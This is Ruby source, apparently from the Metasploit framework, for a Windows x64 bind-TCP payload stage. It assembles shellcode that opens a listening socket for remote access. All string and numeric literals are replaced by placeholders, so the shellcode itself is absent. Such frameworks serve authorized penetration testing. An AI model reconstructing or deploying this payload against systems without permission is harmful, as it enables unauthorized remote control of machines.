require <str> require <str> require <str> require <str> require <str> module Msf module Payload::Windows::BindTcp_x64 include Msf :: Payload :: TransportConfig include Msf :: Payload :: Windows include Msf :: Payload :: Windows :: SendUUID_x64 include Msf :: Payload :: Windows :: BlockApi_x64 include Msf :: Payload :: Windows :: Exitfunk_x64 def generate conf = { <str> : datastore [ <str> ] , <str> : false } unless self . available_space . nil? || required_space > self . available_space conf [ <str> ] = datastore [ <str> ] , conf [ <str> ] = true end generate_bind_tcp ( conf ) end def include_send_uuid false end def use_ipv6 false end def transport_config ( opts = { } ) transport_config_bind_tcp ( opts ) end def generate_bind_tcp ( opts = { } ) combined_asm = <str> asm_block_api <str> asm_bind_tcp ( opts ) <str> Metasm :: Shellcode . assemble ( Metasm :: X64 . new , combined_asm ) . encode_string end def required_space space = cached_size space += <int> space += <int> if use_ipv6 space += uuid_required_size if include_send_uuid space end def asm_bind_tcp ( opts = { } ) reliable = opts [ <str> ] addr_fam = <int> sockaddr_size = <int> stack_alloc = <int> + <int> + <int> * <int> + <int> * <int> if use_ipv6 addr_fam = <int> sockaddr_size = <int> stack_alloc += <int> * <int> end encoded_port = <str> % [ opts [ <str> ] . to_i , addr_fam ] . pack ( <str> ) . unpack ( <str> ) . first asm = <str> if use_ipv6 asm << <str> end asm << <str> encoded_port <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> addr_fam <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> sockaddr_size <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> sockaddr_size <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> stack_alloc <str> asm << asm_send_uuid if include_send_uuid asm << <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> Rex :: Text . block_api_hash ( <str> , <str> ) <str> if opts [ <str> ] asm << asm_exitfunk ( opts ) end asm end end end 
